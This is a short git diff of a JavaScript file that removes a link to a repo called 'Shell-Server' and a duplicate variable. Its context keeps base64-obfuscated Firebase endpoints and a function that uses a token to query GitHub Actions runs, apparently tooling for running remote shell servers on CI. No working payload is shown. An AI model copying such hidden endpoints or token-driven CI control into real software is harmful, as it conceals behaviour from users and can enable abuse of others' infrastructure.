@@ -13,7 +13,6 @@ let mUpdate = new Date().getTime()
 let mStart = parseInt(mUpdate/1000)
 let mTime = new Date().toString()
 
-let mShell = 'https://github.com/cs-hack4/Shell-Server'
 
 let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91Lw==')
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
@@ -209,8 +208,6 @@ async function updateWebsite(id, repo, timeout) {
 }
 
 async function activeAction(id, user, repo, action, storageUrl, token) {
-    let token = null
-
     try {
         let response = await axios.get(`https://api.github.com/repos/${user}/${repo}/actions/runs/${action}`, {
             headers: {
